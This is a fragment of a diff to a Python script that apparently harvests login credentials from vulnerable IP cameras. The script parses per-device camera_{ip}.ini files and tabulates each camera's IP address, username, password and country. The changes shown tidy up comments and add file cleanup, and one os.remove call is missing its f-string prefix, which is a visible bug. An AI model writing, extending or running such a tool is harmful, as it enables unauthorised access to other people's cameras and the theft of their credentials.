@@ -81,16 +81,13 @@ if len(num_of_vulnerable) >= int('1'):
   taro2 = Fore.LIGHTGREEN_EX + str(len(num_of_vulnerable))
 else:
   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
-
-#print(f'Checked devices: {len(list(set(ips)))}\nVulnerable devices: {taro2}\n')
-
+  
 th = ['IP', 'USERNAME', 'PASSWORD', 'COUNTRY']
 td = []
 
 if len(num_of_vulnerable) >= int('1'):
  s = session()
-
- #raz = 0
+ 
  with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
 
   for ipi in num_of_vulnerable:
@@ -113,8 +110,8 @@ if len(num_of_vulnerable) >= int('1'):
         td.append(words[i])
         td.append(words[i+1])
         td.append(ad.country)
-        #os.remove(f'camera_{ipi}.ini')
-        #raz += 1
+        file.close()
+        os.remove(f'camera_{ipi}.ini')
         bar.next()
         break
 
@@ -124,7 +121,8 @@ if len(num_of_vulnerable) >= int('1'):
         td.append(words[i])
         td.append('')
         td.append(ad.country)
-        #os.remove(f'camera_{ipi}.ini')
+        file.close()
+        os.remove('camera_{ipi}.ini')
         bar.next()
         break
       except Exception as e:
